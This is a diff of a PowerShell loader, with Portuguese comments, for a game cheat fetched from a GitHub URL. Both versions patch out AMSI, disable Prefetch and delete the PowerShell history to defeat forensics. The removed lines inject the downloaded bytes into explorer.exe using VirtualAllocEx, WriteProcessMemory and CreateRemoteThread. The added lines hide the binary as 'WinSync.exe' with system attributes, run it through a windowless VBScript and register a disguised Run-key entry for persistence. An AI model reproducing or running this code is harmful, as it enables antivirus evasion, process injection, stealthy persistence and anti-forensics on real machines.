@@ -1,49 +1,26 @@
-# 1. Bypass do AMSI
+# 1. Bypass AMSI
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# 2. Desativa o Prefetch temporariamente
+# 2. Desativa Prefetch
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
 
-# 3. Código C# para injetar (AGORA DENTRO DA VARIÁVEL $payload)
-$payload = @"
-using System;
-using System.Runtime.InteropServices;
-
-public class GhostInject {
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-    [DllImport("kernel32.dll")]
-    public static extern bool CloseHandle(IntPtr hObject);
-
-    public static void Run(string processName, byte[] payload) {
-        var procs = System.Diagnostics.Process.GetProcessesByName(processName);
-        if (procs.Length == 0) return;
-        IntPtr hProc = OpenProcess(0x1F0FFF, false, procs[0].Id);
-        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
-        UIntPtr written;
-        WriteProcessMemory(hProc, addr, payload, (uint)payload.Length, out written);
-        CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-        CloseHandle(hProc);
-    }
-}
-"@
-
-# 4. Baixa o cheat em memória
+# 3. Baixa o cheat e esconde na pasta do Windows Explorer
 $url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
-$bytes = (New-Object System.Net.WebClient).DownloadData($url)
+$path = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\WinSync.exe"
+(New-Object System.Net.WebClient).DownloadFile($url, $path)
+Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
 
-# 5. Carrega o C# na memória
-Add-Type -TypeDefinition $payload -Language CSharp
+# 4. Cria um atalho invisível do VBScript para rodar sem janela
+$vbsPath = "$env:TEMP\sync.vbs"
+"Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"`"`"$path`"`"`", 0, False" | Out-File -FilePath $vbsPath -Encoding ASCII
 
-# 6. Injeta no explorer (ou notepad, se preferir)
-[GhostInject]::Run("explorer", $bytes)
+# 5. Roda o atalho invisível (o cheat abre, mas a janela some)
+Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`""
 
-# 7. Restaura o Prefetch e limpa histórico
+# 6. Persistência (Registra no Windows para abrir no boot)
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath -Name "WinSyncClient" -Value "wscript.exe `"$vbsPath`""
+
+# 7. Restaura Prefetch e limpa histórico
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
